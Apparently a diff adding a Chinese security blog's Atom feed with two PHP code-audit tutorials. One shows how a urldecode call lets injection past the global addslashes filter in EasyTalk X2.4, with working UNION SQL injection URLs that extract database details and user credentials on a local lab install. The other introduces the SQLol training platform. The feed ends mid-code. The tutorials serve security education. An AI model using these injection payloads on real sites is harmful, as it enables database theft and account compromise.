@@ -1,0 +1,655 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>Braid&#39;s Blog</title>
+  <subtitle>攻城狮，黑客，网络安全爱好者</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://hackbraid.github.io/"/>
+  <updated>2015-12-24T02:23:11.435Z</updated>
+  <id>http://hackbraid.github.io/</id>
+  
+  <author>
+    <name>Braid</name>
+    <email>hackbraid@gmail.com</email>
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 2.全局防护Bypass之UrlDecode</title>
+    <link href="http://hackbraid.github.io/2015/12/24/sql1/"/>
+    <id>http://hackbraid.github.io/2015/12/24/sql1/</id>
+    <published>2015-12-24T02:35:00.000Z</published>
+    <updated>2015-12-24T02:23:11.435Z</updated>
+    
+    <content type="html">&lt;h2 id=&quot;0x01_背景&quot;&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;现在的WEB程序基本都有对SQL注入的全局过滤，像PHP开启了GPC或者在全局文件common.php上使用addslashes()函数对接收的参数进行过滤，尤其是单引号。遇到这种情况我们就需要找一些编码解码的函数来绕过全局防护，这篇文章讲urldecode()的情况，同样大牛请自觉绕道~&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql01_1.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&quot;0x02_环境搭建&quot;&gt;0x02 环境搭建&lt;/h2&gt;&lt;p&gt;看背景我们使用了低版本的easytalk程序，版本为X2.4&lt;br&gt;①源码我打包了一份：&lt;a href=&quot;http://pan.baidu.com/s/1bopOFNL&quot; title=&quot;easytalk.zip&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://pan.baidu.com/s/1bopOFNL&lt;/a&gt;&lt;br&gt;②解压到www的easytalk目录下，按照提示一步步安装即可，遇到问题自行百度或谷歌，成功后访问如下图：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql01_2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;h2 id=&quot;0x03_漏洞分析&quot;&gt;0x03 漏洞分析&lt;/h2&gt;&lt;p&gt;首先看下源码结构，用的ThinkPHP框架，比较复杂：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql01_3.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;有兴趣的可以去研究下再继续往下看，新手可以知道ThinkPHP对接收的参数是有过滤的，并且根据你服务器是否开启GPC会做相应的处理：&lt;br&gt;1./ThinkPHP/Extend/Library/ORG/Util/Input.class.php文件第266行：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/**
+ +----------------------------------------------------------
+ * 如果 magic_quotes_gpc 为关闭状态，这个函数可以转义字符串
+ +----------------------------------------------------------
+ * @access public
+ +----------------------------------------------------------
+ * @param string &lt;span class=&quot;variable&quot;&gt;$string&lt;/span&gt; 要处理的字符串
+ +----------------------------------------------------------
+ * @&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; string
+ +----------------------------------------------------------
+ */
+static public &lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; addSlashes(&lt;span class=&quot;variable&quot;&gt;$string&lt;/span&gt;) {
+    if (!get_magic_quotes_gpc()) {
+        &lt;span class=&quot;variable&quot;&gt;$string&lt;/span&gt; = addslashes(&lt;span class=&quot;variable&quot;&gt;$string&lt;/span&gt;);
+    }
+    return &lt;span class=&quot;variable&quot;&gt;$string&lt;/span&gt;;
+}    
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2.使用Seay代码审计系统的全局搜索功能，搜索包含关键字为”urldecode”的文件，发现TopicAction.class.php包含一个对接收的参数keyword进行urldecode的地方：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql01_4.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;3.我们跟进这个php文件，发现接收keyword就对其进行urldecode转码，然后立即带入查询，造成注入：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;public &lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; topic() {
+    &lt;span class=&quot;variable&quot;&gt;$keyword&lt;/span&gt;=&lt;span class=&quot;variable&quot;&gt;$this-&lt;/span&gt;&amp;gt;_get(&lt;span class=&quot;string&quot;&gt;&#39;keyword&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;urldecode&#39;&lt;/span&gt;);//这里对get接收的keyword参数进行urldecode
+    if (&lt;span class=&quot;variable&quot;&gt;$keyword&lt;/span&gt;) {
+        &lt;span class=&quot;variable&quot;&gt;$topic&lt;/span&gt; = D(&lt;span class=&quot;string&quot;&gt;&#39;Topic&#39;&lt;/span&gt;)-&amp;gt;where(&lt;span class=&quot;string&quot;&gt;&quot;topicname=&#39;$keyword&#39;&quot;&lt;/span&gt;)-&amp;gt;find();//ok，带入查询了
+        if (&lt;span class=&quot;variable&quot;&gt;$topic&lt;/span&gt;) {
+            &lt;span class=&quot;variable&quot;&gt;$isfollow&lt;/span&gt;=D(&lt;span class=&quot;string&quot;&gt;&#39;Mytopic&#39;&lt;/span&gt;)-&amp;gt;isfollow(&lt;span class=&quot;variable&quot;&gt;$topic&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;id&#39;&lt;/span&gt;],&lt;span class=&quot;variable&quot;&gt;$this-&lt;/span&gt;&amp;gt;my[&lt;span class=&quot;string&quot;&gt;&#39;user_id&#39;&lt;/span&gt;]);
+            &lt;span class=&quot;variable&quot;&gt;$topicusers&lt;/span&gt;=D(&lt;span class=&quot;string&quot;&gt;&#39;MytopicView&#39;&lt;/span&gt;)-&amp;gt;where(&lt;span class=&quot;string&quot;&gt;&quot;topicid=&#39;$topic[id]&#39;&quot;&lt;/span&gt;)-&amp;gt;order(&lt;span class=&quot;string&quot;&gt;&#39;id desc&#39;&lt;/span&gt;)-&amp;gt;limit(&lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;)-&amp;gt;select();
+            //getwidget
+            &lt;span class=&quot;variable&quot;&gt;$widget&lt;/span&gt;=M(&lt;span class=&quot;string&quot;&gt;&#39;Topicwidget&#39;&lt;/span&gt;)-&amp;gt;where(&lt;span class=&quot;string&quot;&gt;&quot;topicid=&#39;$topic[id]&#39;&quot;&lt;/span&gt;)-&amp;gt;order(&lt;span class=&quot;string&quot;&gt;&#39;`order` ASC&#39;&lt;/span&gt;)-&amp;gt;select();
+            if (&lt;span class=&quot;variable&quot;&gt;$widget&lt;/span&gt;) {
+                foreach (&lt;span class=&quot;variable&quot;&gt;$widget&lt;/span&gt; as &lt;span class=&quot;variable&quot;&gt;$val&lt;/span&gt;) {
+                    &lt;span class=&quot;variable&quot;&gt;$topicwidget&lt;/span&gt;[&lt;span class=&quot;variable&quot;&gt;$val&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;widgettype&#39;&lt;/span&gt;]][]=&lt;span class=&quot;variable&quot;&gt;$val&lt;/span&gt;;
+                }
+            }
+            &lt;span class=&quot;variable&quot;&gt;$this-&lt;/span&gt;&amp;gt;assign(&lt;span class=&quot;string&quot;&gt;&#39;topicwidget&#39;&lt;/span&gt;,&lt;span class=&quot;variable&quot;&gt;$topicwidget&lt;/span&gt;);
+        } else {
+            &lt;span class=&quot;variable&quot;&gt;$count&lt;/span&gt;=&lt;span class=&quot;variable&quot;&gt;$isfollow&lt;/span&gt;=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;
+        }
+
+        &lt;span class=&quot;variable&quot;&gt;$this-&lt;/span&gt;&amp;gt;assign(&lt;span class=&quot;string&quot;&gt;&#39;comefrom&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;topic&#39;&lt;/span&gt;);
+        &lt;span class=&quot;variable&quot;&gt;$this-&lt;/span&gt;&amp;gt;assign(&lt;span class=&quot;string&quot;&gt;&#39;keyword&#39;&lt;/span&gt;,&lt;span class=&quot;variable&quot;&gt;$keyword&lt;/span&gt;);
+        &lt;span class=&quot;variable&quot;&gt;$this-&lt;/span&gt;&amp;gt;assign(&lt;span class=&quot;string&quot;&gt;&#39;topic&#39;&lt;/span&gt;,&lt;span class=&quot;variable&quot;&gt;$topic&lt;/span&gt;);
+        &lt;span class=&quot;variable&quot;&gt;$this-&lt;/span&gt;&amp;gt;assign(&lt;span class=&quot;string&quot;&gt;&#39;topicusers&#39;&lt;/span&gt;,&lt;span class=&quot;variable&quot;&gt;$topicusers&lt;/span&gt;);
+        &lt;span class=&quot;variable&quot;&gt;$this-&lt;/span&gt;&amp;gt;assign(&lt;span class=&quot;string&quot;&gt;&#39;isfollow&#39;&lt;/span&gt;,&lt;span class=&quot;variable&quot;&gt;$isfollow&lt;/span&gt;);
+        &lt;span class=&quot;variable&quot;&gt;$this-&lt;/span&gt;&amp;gt;assign(&lt;span class=&quot;string&quot;&gt;&#39;subname&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;#&#39;&lt;/span&gt;.&lt;span class=&quot;variable&quot;&gt;$keyword&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&#39;#&#39;&lt;/span&gt;);
+        &lt;span class=&quot;variable&quot;&gt;$this-&lt;/span&gt;&amp;gt;display();
+    } else {
+        header(&lt;span class=&quot;string&quot;&gt;&quot;location:&quot;&lt;/span&gt;.SITE_URL.&lt;span class=&quot;string&quot;&gt;&#39;/?m=topic&amp;amp;a=index&#39;&lt;/span&gt;);
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;0x04_漏洞证明&quot;&gt;0x04 漏洞证明&lt;/h2&gt;&lt;p&gt;1.我们构造获取数据库相关信息的POC：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&lt;span class=&quot;rule&quot;&gt;&lt;span class=&quot;attribute&quot;&gt;http&lt;/span&gt;:&lt;span class=&quot;value&quot;&gt;//localhost/eazytalk/?m=topic&amp;amp;a=topic&amp;amp;keyword=aaa%&lt;span class=&quot;number&quot;&gt;2527&lt;/span&gt; and &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;=&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; union select &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;,&lt;span class=&quot;function&quot;&gt;concat&lt;/span&gt;(&lt;span class=&quot;function&quot;&gt;database&lt;/span&gt;(),&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;x5c,&lt;span class=&quot;function&quot;&gt;user&lt;/span&gt;(),&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;x5c,&lt;span class=&quot;function&quot;&gt;version&lt;/span&gt;()),&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt; %&lt;span class=&quot;number&quot;&gt;23&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功获取到信息如下：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql01_7.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;查看下MySql日志，发现成功执行了sql语句：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql01_8.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;2.我们构造获取数据库eazytalk所有表的POC：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&lt;span class=&quot;keyword&quot;&gt;http&lt;/span&gt;://localhost/eazytalk/?m=topic&amp;amp;&lt;span class=&quot;operator&quot;&gt;a&lt;/span&gt;=topic&amp;amp;keyword=aaa%&lt;span class=&quot;number&quot;&gt;2527&lt;/span&gt; &lt;span class=&quot;operator&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;=&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;union&lt;/span&gt; select &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;, (select GROUP_CONCAT(DISTINCT table_name) &lt;span class=&quot;built_in&quot;&gt;from&lt;/span&gt; information_schema.tables where table_schema=&lt;span class=&quot;number&quot;&gt;0x6561737974616C6B&lt;/span&gt;),&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;%&lt;span class=&quot;number&quot;&gt;23&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功获取所有表信息如下：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql01_9.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;4.构造获取表et_users所有字段信息的POC：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&lt;span class=&quot;keyword&quot;&gt;http&lt;/span&gt;://localhost/eazytalk/?m=topic&amp;amp;&lt;span class=&quot;operator&quot;&gt;a&lt;/span&gt;=topic&amp;amp;keyword=aaa%&lt;span class=&quot;number&quot;&gt;2527&lt;/span&gt; &lt;span class=&quot;operator&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;=&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;union&lt;/span&gt; select &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;, (select GROUP_CONCAT(DISTINCT column_name) &lt;span class=&quot;built_in&quot;&gt;from&lt;/span&gt; information_schema.columns where table_name=&lt;span class=&quot;number&quot;&gt;0x65745F7573657273&lt;/span&gt;),&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;%&lt;span class=&quot;number&quot;&gt;23&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功获取表et_users所有字段信息如下：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql01_10.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;5.构造获取et_users表第一条账户的POC：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&lt;span class=&quot;keyword&quot;&gt;http&lt;/span&gt;://localhost/eazytalk/?m=topic&amp;amp;&lt;span class=&quot;operator&quot;&gt;a&lt;/span&gt;=topic&amp;amp;keyword=aaa%&lt;span class=&quot;number&quot;&gt;2527&lt;/span&gt; &lt;span class=&quot;operator&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;=&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;union&lt;/span&gt; select &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;, (select GROUP_CONCAT(DISTINCT user_name,&lt;span class=&quot;number&quot;&gt;0x5f&lt;/span&gt;,password) &lt;span class=&quot;built_in&quot;&gt;from&lt;/span&gt; et_users limit &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;),&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;%&lt;span class=&quot;number&quot;&gt;23&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功获取表admin的账户密码如下：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql01_11.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;本文由HackBraid整理总结，如需转载请联系作者。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;0x01_背景&quot;&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;现在的WEB程序基本都有对SQL注入的全局过滤，像PHP开启了GPC或者在全局文件common.php上使用addslashes()函数对接收的参数进行过滤，尤其是单引号。遇到这种情况我们就需要找一些编码解码的函数来绕过全局防护，这篇文章讲urldecode()的情况，同样大牛请自觉绕道~&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql01_1.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="WEB安全" scheme="http://hackbraid.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="PHP" scheme="http://hackbraid.github.io/tags/PHP/"/>
+    
+      <category term="SQL注入" scheme="http://hackbraid.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+      <category term="代码审计" scheme="http://hackbraid.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 1.什么都没过滤的入门情况</title>
+    <link href="http://hackbraid.github.io/2015/12/17/sql0/"/>
+    <id>http://hackbraid.github.io/2015/12/17/sql0/</id>
+    <published>2015-12-17T09:35:00.000Z</published>
+    <updated>2015-12-18T06:55:58.845Z</updated>
+    
+    <content type="html">&lt;h2 id=&quot;0x01_背景&quot;&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;首先恭喜Seay法师的力作《代码审计：企业级web代码安全架构》，读了两天后深有感触。想了想自己也做审计有2年了，决定写个PHP代码审计实例教程的系列，希望能够帮助到新人更好的了解这一领域，同时也作为自己的一种沉淀。大牛请自觉绕道~&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&quot;0x02_环境搭建&quot;&gt;0x02 环境搭建&lt;/h2&gt;&lt;p&gt;PHP+MySql的集成环境特别多，像PhpStudy、Wamp和Lamp等下一步下一步点下去就成功安装了，网上搜索一下很多就不赘述。&lt;br&gt;这里提的环境是SQLol，它是一个可配置的SQL注入测试平台，包含了简单的SQL注入测试环境，即SQL语句的四元素增（Insert）、删（Delete）、改（Update）和查（Select）。&lt;br&gt;PS：什么都没过滤的情况太少了，现在再怎么没有接触过安全的程序员都知道用一些现成的框架来写代码，都有过滤的。所以这个平台主要训练在各种情况下如何进行sql注入以及如何写POC。&lt;br&gt;①源码我打包了一份：&lt;a href=&quot;http://pan.baidu.com/s/1nu2vaOT&quot; title=&quot;Sqlol.zip&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://pan.baidu.com/s/1nu2vaOT&lt;/a&gt;&lt;br&gt;②解压到www的sql目录下，直接打开&lt;a href=&quot;http://localhost/sql即可看到如下界面：&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://localhost/sql即可看到如下界面：&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sql1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;h2 id=&quot;0x03_漏洞分析&quot;&gt;0x03 漏洞分析&lt;/h2&gt;&lt;p&gt;首先看下源码结构，比较简单，只有一个include文件夹包含一些数据库配置文件：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sqlol0.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;这里进行简单的源码分析，看不懂就略过以后再看~&lt;br&gt;1.看select.php文件，开始引入了/include/nav.inc.php&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&lt;span class=&quot;php&quot;&gt;&lt;span class=&quot;preprocessor&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;includes/nav.inc.php&#39;&lt;/span&gt;);
+&lt;span class=&quot;preprocessor&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2.跟进nav.inc.php文件，发现该文件是select的核心表单提交页面以及输入处理程序：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/sqlol2.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;表单的输入处理程序比较简单，主要是根据你表单的选择作出相应的过滤和处理，如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&lt;span class=&quot;php&quot;&gt;&lt;span class=&quot;preprocessor&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;variable&quot;&gt;$_REQUEST&lt;/span&gt; = array_merge(&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;$_POST&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;$_COOKIE&lt;/span&gt;);
+
+&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;submit&#39;&lt;/span&gt;])){ &lt;span class=&quot;comment&quot;&gt;//submit后，开始进入处理程序&lt;/span&gt;
+
+&lt;span class=&quot;keyword&quot;&gt;switch&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;sanitize_quotes&#39;&lt;/span&gt;]){ &lt;span class=&quot;comment&quot;&gt;//单引号的处理，表单选择不过滤，就是对应none，新手看不懂可以学好php再回来&lt;/span&gt;
+
+    &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;quotes_double&#39;&lt;/span&gt;:
+        &lt;span class=&quot;variable&quot;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;] = str_replace(&lt;span class=&quot;string&quot;&gt;&#39;\&#39;&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;\&#39;\&#39;&#39;&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;]);
+        &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;
+    &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;quotes_escape&#39;&lt;/span&gt;:
+        &lt;span class=&quot;variable&quot;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;] = str_replace(&lt;span class=&quot;string&quot;&gt;&#39;\&#39;&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;\\\&#39;&#39;&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;]);
+        &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;
+    &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;quotes_remove&#39;&lt;/span&gt;:
+        &lt;span class=&quot;variable&quot;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;] = str_replace(&lt;span class=&quot;string&quot;&gt;&#39;\&#39;&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;]);
+        &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;
+
+}
+
+&lt;span class=&quot;comment&quot;&gt;//对空格的处理，如果参数中没有spaces_remove或者spaces_remove！=on就不会过滤空格&lt;/span&gt;
+&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;spaces_remove&#39;&lt;/span&gt;]) &lt;span class=&quot;keyword&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;spaces_remove&#39;&lt;/span&gt;] == &lt;span class=&quot;string&quot;&gt;&#39;on&#39;&lt;/span&gt;) &lt;span class=&quot;variable&quot;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;] = str_replace(&lt;span class=&quot;string&quot;&gt;&#39; &#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;]);
+
+&lt;span class=&quot;comment&quot;&gt;//黑名单关键字的处理，文章用不上，略过...&lt;/span&gt;
+&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;blacklist_keywords&#39;&lt;/span&gt;])){
+    &lt;span class=&quot;variable&quot;&gt;$blacklist&lt;/span&gt; = explode(&lt;span class=&quot;string&quot;&gt;&#39;,&#39;&lt;/span&gt; , &lt;span class=&quot;variable&quot;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;blacklist_keywords&#39;&lt;/span&gt;]);
+}
+&lt;span class=&quot;comment&quot;&gt;//过滤级别，新手可以不用管，略过...&lt;/span&gt;
+&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;blacklist_level&#39;&lt;/span&gt;])){
+    &lt;span class=&quot;keyword&quot;&gt;switch&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;blacklist_level&#39;&lt;/span&gt;]){
+        &lt;span class=&quot;comment&quot;&gt;//We process blacklists differently at each level. At the lowest, each keyword is removed case-sensitively.&lt;/span&gt;
+        &lt;span class=&quot;comment&quot;&gt;//At medium blacklisting, checks are done case-insensitively.&lt;/span&gt;
+        &lt;span class=&quot;comment&quot;&gt;//At the highest level, checks are done case-insensitively and repeatedly.&lt;/span&gt;
+
+        &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;low&#39;&lt;/span&gt;:
+            &lt;span class=&quot;keyword&quot;&gt;foreach&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$blacklist&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$keyword&lt;/span&gt;){
+                &lt;span class=&quot;variable&quot;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;] = str_replace(&lt;span class=&quot;variable&quot;&gt;$keyword&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;]);
+            }
+            &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;
+        &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;medium&#39;&lt;/span&gt;:
+            &lt;span class=&quot;keyword&quot;&gt;foreach&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$blacklist&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$keyword&lt;/span&gt;){
+                &lt;span class=&quot;variable&quot;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;] = str_replace(strtolower(&lt;span class=&quot;variable&quot;&gt;$keyword&lt;/span&gt;), &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;, strtolower(&lt;span class=&quot;variable&quot;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;inject_string&#39;&lt;/span&gt;]));
+            }
+            &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;
+        &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;high&#39;&lt;/span&gt;:
+            &lt;span class=&quot;keyword&quot;&gt;do&lt;/span&gt;{
+                &lt;span class=&quot;variable&quot;&gt;$keyword_found&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;
